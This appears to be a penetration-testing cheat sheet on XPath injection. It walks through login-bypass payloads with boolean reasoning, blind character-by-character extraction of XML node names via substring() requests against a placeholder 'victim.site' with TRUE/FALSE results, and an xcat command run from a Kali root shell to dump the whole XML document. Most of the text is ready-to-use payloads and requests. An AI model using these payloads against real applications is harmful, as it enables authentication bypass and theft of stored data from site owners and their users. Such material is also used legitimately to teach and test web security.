# XPath authentication query

<someNode>[username='<USERNAME>' and password='<PASSWORD>']

Choosing username as injecion parameter:
' or 'a'='a' or 'a'='a

XPath query would now be:
//<someNode>[username='' or 'a'='a' or 'a'='a' and password='']

Expression:
username='' or 'a'='a' or 'a'='a' and password=''
    A             C          D           B

can be represented as:
(A OR C) OR (D AND B)

In an OR comparison, the second condition (D AND B) is checked only if the first (A OR C) is FALSE.
Since A OR C is always TRUE, the second is never checked: the attacker has neutralized the AND.

Choosing password as injecion parameter:
' or 'a'='a

XPath query would now be:
//<someNode>[username='' and password='' or 'a'='a']

Expression:
username='' and password='' or 'a'='a'
    A             B               C

can be represented as:
(A AND B) OR (C)

The expression (C) is always TRUE, so the overall query is always TRUE and, therefore, returns a result set.

Goal extraction of attacker
SQL database: schemas, tables, columns
XML document: nodes, attributes, values

Exploitation

<http://victim.site/getInfo.php?countryID=1>'

//[id=$countryID]/<otherNode>
//<someNode>[id=$countryID]
//<someNode>[@id=$countryID]
//<someNode>[id=$countryID]/<otherNode>

999999999 or "a"="a"

<http://victim.site/getInfo.php?countryID=999999999> or "a"="a"
<http://victim.site/getInfo.php?countryID=999999999> or "a"="b"

substring(name(/*[1]),1,1)="a"

//<someNode>[id=999 or substring(name(/*[1]),1,1)="a"]/<otherNode>

<http://victim.site/getInfo.php?countryID=999> or substring(name(/*[1]),1,1)="a" FALSE
<http://victim.site/getInfo.php?countryID=999> or substring(name(/*[1]),1,1)="b" FALSE
<http://victim.site/getInfo.php?countryID=999> or substring(name(/*[1]),1,1)="c" TRUE

<http://victim.site/getInfo.php?countryID=999> or substring(name(/*[1]),2,1)="o" TRUE
<http://victim.site/getInfo.php?countryID=999> or substring(name(/*[1]),3,1)="u" TRUE

<http://victim.site/getInfo.php?countryID=999> or name(/*[1])="countries" TRUE
<http://victim.site/getInfo.php?countryID=999> or name(/*[1])="countriessssss" FALSE

USING XCAT

root@kali:~# xcat --method=GET <http://victim.site/getInfo.php> countryID=1 countryID "USA" run retrieve --output /root/Desktop/result.xml --format xml
